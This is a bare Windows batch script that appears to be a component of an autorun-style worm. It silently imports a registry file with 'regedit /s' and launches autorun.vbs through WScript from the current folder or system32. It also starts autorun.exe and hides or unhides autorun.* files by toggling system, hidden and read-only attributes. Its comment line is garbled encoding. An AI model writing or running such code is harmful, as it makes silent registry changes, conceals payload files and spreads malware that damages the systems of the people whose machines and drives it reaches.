@echo off
rem autorun·ç±©
if exist .\autorun.reg regedit /s .\autorun.reg
if not "%1"=="" goto open
if exist autorun.vbs start WScript.exe autorun.vbs&exit
if exist %SYSTEMROOT%\system32\autorun.vbs start WScript.exe %SYSTEMROOT%\system32\autorun.vbs&exit
exit
:open
if not "%1"=="Open" goto next
start explorer .\
exit
:next
if not "%1"=="Over" goto :next2
if exist .\autorun.bin type .\autorun.bin >C:\autorun.txt&&exit
if exist %SYSTEMROOT%\system32\autorun.bin type %SYSTEMROOT%\system32\autorun.bin >c:\autorun.txt&&exit
exit
:next2
start autorun.exe
if "%1"=="-" attrib -s -a -h -r %2\autorun.*
if "%1"=="+" attrib +s +a +h +r %2\autorun.*
:end
